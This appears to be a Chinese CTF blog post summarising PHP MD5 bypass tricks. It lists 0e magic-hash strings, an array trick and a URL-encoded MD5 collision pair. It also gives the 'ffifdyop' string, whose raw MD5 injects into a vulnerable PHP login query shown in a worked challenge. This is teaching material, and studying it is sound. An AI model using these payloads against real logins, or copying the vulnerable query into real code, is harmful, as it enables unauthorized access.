---
title: "MD5绕过总结"
subtitle: ""
date: 2024-03-02T18:43:43+08:00
draft: false

tags: ["md5"]
categories: ["Bypass"]

---

### 常规0e绕过

- QNKCDZO

- 240610708

- s878926199a

- s155964671a

- s214587387a

- s214587387a

> 这些字符串的md5值都是0e开头，e代表科学计数法，这些值在php弱类型比较中`==`判断为相等

### 数组绕过

一个数组无法进行md5加密，可绕过php强类型`===`比较

### 强类型绕过

即md5碰撞

如题

```php
if((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b']))
```

用一些md5值相等的字符串

```
M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2

M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2
```

### 特殊字符串ffifdyop

该字符串经过md5加密后：276f722736c95d99e921722cf9ed621c  

再转换为字符串即为：`'or'6<乱码>`

用途：

```
select * from admin where password=''or'6<乱码>'
```

相当于

```
select * from admin where password='' or true
```

可以用来实现sql注入

除此之外

`129581926211651571912466741651878684928`也可达到同样的效果

#### 实战

题目链接：http://ctf5.shiyanbar.com/web/houtai/ffifdyop.php

![](/img/MD5绕过总结/1.png)

注释中的源码如下

```php
 $password=$_POST['password'];
    $sql = "SELECT * FROM admin WHERE username = 'admin' and password = '".md5($password,true)."'";
    $result=mysqli_query($link,$sql);
        if(mysqli_num_rows($result)>0){
            echo 'flag is :'.$flag;
        }
        else{
            echo '密码错误!';
        }
```



提交ffifdyop，使查询语句变成

```
select * from admin where username='admin' and password ='' or '6<乱码>'
```

实现sql注入

![](/img/MD5绕过总结/2.png)